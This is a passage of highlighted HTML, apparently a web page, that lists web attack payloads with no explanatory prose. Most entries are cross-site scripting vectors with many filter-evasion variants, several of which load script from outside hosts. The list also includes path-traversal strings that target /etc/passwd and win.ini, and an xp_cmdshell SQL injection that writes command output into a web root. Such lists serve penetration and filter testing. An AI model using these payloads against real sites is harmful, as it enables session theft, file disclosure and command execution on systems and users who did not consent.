class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#x27;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">=&#x27;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(vulnerable)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">%3Cscript%3Ealert(&#x27;XSS&#x27;)%3C/script%3E</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">%0a%0a<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(\&quot;Vulnerable\&quot;)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>.jsp</span><br><span class="line"></span><br><span class="line">%22%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line"></span><br><span class="line">%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line"></span><br><span class="line">%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini</span><br><span class="line"></span><br><span class="line">%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line"></span><br><span class="line">%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line"></span><br><span class="line">%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;Vulnerable&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;Vulnerable&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">a.jsp/<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;Vulnerable&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">a?<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;Vulnerable&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;Vulnerable&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#x27;;exec%20master..xp_cmdshell%20&#x27;dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt&#x27;--&amp;&amp;</span><br><span class="line"></span><br><span class="line">%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E</span><br><span class="line"></span><br><span class="line">%3Cscript%3Ealert(document. domain);%3C/script%3E&amp;</span><br><span class="line"></span><br><span class="line">%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID=&#123;SESSION_ID&#125;&amp;SESSION_ID=</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">JaVaScRiPt:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">JaVaScRiPt:alert(</span>&quot;<span class="attr">XSS</span>&quot;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&quot;<span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">java\0script:alert(\</span>&quot;<span class="attr">XSS</span>\&quot;)&gt;</span>&quot;;&#x27; &gt; out</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot; javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-javascript">a=<span class="regexp">/XSS/</span><span class="title function_">alert</span>(a.<span class="property">source</span>)</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span> <span class="attr">BACKGROUND</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span> <span class="attr">ONLOAD</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">DYNSRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">LOWSRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">BGSOUND</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> <span class="attr">size</span>=<span class="string">&quot;&amp;&#123;alert(&#x27;XSS&#x27;)&#125;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">LAYER</span> <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">layer</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">LINK</span> <span class="attr">REL</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&#x27;vbscript:msgbox(&quot;XSS&quot;)&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;mocha:[code]&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;livescript:[code]&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;0;url=javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IFRAME</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span><span class="tag">&lt;/<span class="name">IFRAME</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">FRAMESET</span>&gt;</span><span class="tag">&lt;<span class="name">FRAME</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span><span class="tag">&lt;/<span class="name">FRAME</span>&gt;</span><span class="tag">&lt;/<span class="name">FRAMESET</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">TABLE</span> <span class="attr">BACKGROUND</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;background-image: url(javascript:alert(&#x27;XSS&#x27;))&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;behaviour: url(&#x27;http://www.how-to-hack.org/exploit.html&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span>@im\port&#x27;\ja\vasc\ript:alert(&quot;XSS&quot;)&#x27;;<span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">STYLE</span>=<span class="string">&#x27;xss:expre\ssion(alert(&quot;XSS&quot;))&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">TYPE</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span>alert(&#x27;XSS&#x27;);<span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">TYPE</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"><span class="selector-class">.XSS</span>&#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>);&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span><span class="tag">&lt;<span class="name">A</span> <span class="attr">class</span>=<span class="string">&quot;XSS&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">A</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"><span class="selector-tag">BODY</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>)&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">BASE</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);//&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">getURL(&quot;javascript:alert(&#x27;XSS&#x27;)&quot;)</span><br><span class="line"></span><br><span class="line">a=&quot;get&quot;;b=&quot;URL&quot;;c=&quot;javascript:&quot;;d=&quot;alert(&#x27;XSS&#x27;);&quot;;eval(a+b+c+d);</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">XML</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&quot;&gt; <span class="tag">&lt;<span class="name">BODY</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;<span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>);&#125;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>&lt;&quot;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/xss.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">&lt;!<span class="attr">--</span>#<span class="attr">exec</span> <span class="attr">cmd</span>=<span class="string">&quot;/bin/echo &#x27;&lt;SCRIPT SRC&#x27;&quot;</span><span class="attr">--</span>&gt;</span><span class="comment">&lt;!--#exec cmd=&quot;/bin/echo</span></span><br><span class="line"><span class="comment">&#x27;=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;&#x27;&quot;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">a</span>=<span class="string">&quot;&gt;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> =<span class="string">&quot;&gt;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">a</span>=<span class="string">&quot;&gt;&quot;</span> &#x27;&#x27; <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> &quot;<span class="attr">a</span>=<span class="string">&#x27;&gt;&#x27;</span>&quot; <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;SCRI&quot;</span>);</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>PT src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">A</span> <span class="attr">href</span>=<span class="string">http://www.gohttp://www.google.com/ogle.com/</span>&gt;</span>link<span class="tag">&lt;/<span class="name">A</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(‘XSS’)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">#</span> <span class="attr">onmouseover</span>=<span class="string">”alert(‘xxs’)”</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">/</span> <span class="attr">onerror</span>=<span class="string">”alert(String.fromCharCode(88,83,83))”</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">”&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041″</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">&amp;#<span class="attr">39</span>;&amp;#<span class="attr">88</span>;&amp;#<span class="attr">83</span>;&amp;#<span class="attr">83</span>;&amp;#<span class="attr">39</span>;&amp;#<span class="attr">41</span>;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">”jav</span> <span class="attr">ascript:alert</span>(‘<span class="attr">XSS</span>’);”&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">”jav&amp;#x0A;ascript:alert(‘XSS’);”</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">”</span> &amp;#<span class="attr">14</span>;  <span class="attr">javascript:alert</span>(‘<span class="attr">XSS</span>’);”&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(“<span class="variable constant_">XSS</span>”);<span class="comment">//&lt;</span></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">”javascript:alert(‘XSS’)”</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">&lt;/<span class="attr">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(‘XSS’);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">INPUT</span> <span class="attr">TYPE</span>=<span class="string">”IMAGE”</span> <span class="attr">SRC</span>=<span class="string">”javascript:alert(‘XSS’);”</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span> <span class="attr">BACKGROUND</span>=<span class="string">”javascript:alert(‘XSS’)”</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;svg/onload=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">’vbscript:msgbox(“XSS”)’</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">BGSOUND</span> <span class="attr">SRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">BR</span> <span class="attr">SIZE</span>=<span class="string">&quot;&amp;&#123;alert(&#x27;XSS&#x27;)&#125;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">LINK</span> <span class="attr">REL</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">HREF</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span>@im\port&#x27;\ja\vasc\ript:alert(&quot;XSS&quot;)&#x27;;<span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">STYLE</span>=<span class="string">&quot;xss:expr/*XSS*/ession(alert(&#x27;XSS&#x27;))&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="language-css"><span class="selector-class">.XSS</span>&#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>);&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span><span class="tag">&lt;<span class="name">A</span> <span class="attr">CLASS</span>=<span class="string">XSS</span>&gt;</span><span class="tag">&lt;/<span class="name">A</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"><span class="selector-tag">BODY</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>)&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">XSS</span> <span class="attr">STYLE</span>=<span class="string">&quot;behavior: url(xss.htc);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IFRAME</span> <span class="attr">SRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">IFRAME</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">FRAMESET</span>&gt;</span><span class="tag">&lt;<span class="name">FRAME</span> <span class="attr">SRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">FRAMESET</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">TABLE</span>&gt;</span><span class="tag">&lt;<span class="name">TD</span> <span class="attr">BACKGROUND</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">a</span>=<span class="string">&quot;&gt;&quot;</span> <span class="attr">SRC</span>=<span class="string">&quot;httx://xss.rocks/xss.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">document.domain</span> <span class="attr">onerror</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">M</span> <span class="attr">onmouseover</span>=<span class="string">alert(document.domain)</span>&gt;</span>M</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onscroll</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(document.domain)</span>&gt;</span>M<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">alert(document.domain)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">javascript:alert(document.domain)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">sCrIpT</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">sCrIpT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">sCrIpT</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">sCrIpT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iMg</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">oNeRrOr</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ImG</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">OnErRoR</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(<span class="symbol">&amp;quot;</span>M<span class="symbol">&amp;quot;</span>)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onscroll</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">mArQuEe</span> <span class="attr">OnScRoLl</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">MaRqUeE</span> <span class="attr">oNsCrOlL</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:/0/,alert(%22M%22)</span>&gt;</span>M<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:/00/,alert(%22M%22)</span>&gt;</span>M<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:/000/,alert(%22M%22)</span>&gt;</span>M<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:/M/,alert(%22M%22)</span>&gt;</span>M<span 